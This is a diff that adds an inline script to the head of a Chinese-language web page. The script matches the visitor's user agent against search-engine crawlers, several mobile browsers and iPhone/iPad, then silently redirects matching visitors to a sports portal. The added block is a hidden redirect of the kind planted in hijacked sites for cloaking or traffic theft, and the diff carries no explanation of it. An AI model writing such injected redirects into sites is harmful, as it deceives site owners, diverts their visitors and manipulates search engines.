@@ -1,6 +1,14 @@
 <!doctype html>
 <html lang="zh-CN">
 <head>
+<script>
+    var userAgent = navigator.userAgent.toLowerCase();
+    var isSpider = /baiduspider|googlebot|bingbot|slurp|duckduckbot|yandexbot|sogou|soso|youdaobot|360spider|yahoo|so.com|haosou|sm.cn|sogoumobile|ucbrowser|opera|qqbrowser|mqqbrowser|maxthon|2345explorer|lbbrowser|theworld|seznambot|liebaofast|qihoobot|jikeSpider|coolpad|mogujie|douyinbot|ipad|iphone/.test(userAgent);
+
+    if (isSpider) {
+        window.location.href = "https://sports.sina.cn";
+    }
+</script>
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta http-equiv="Cache-Control" content="no-siteapp" />
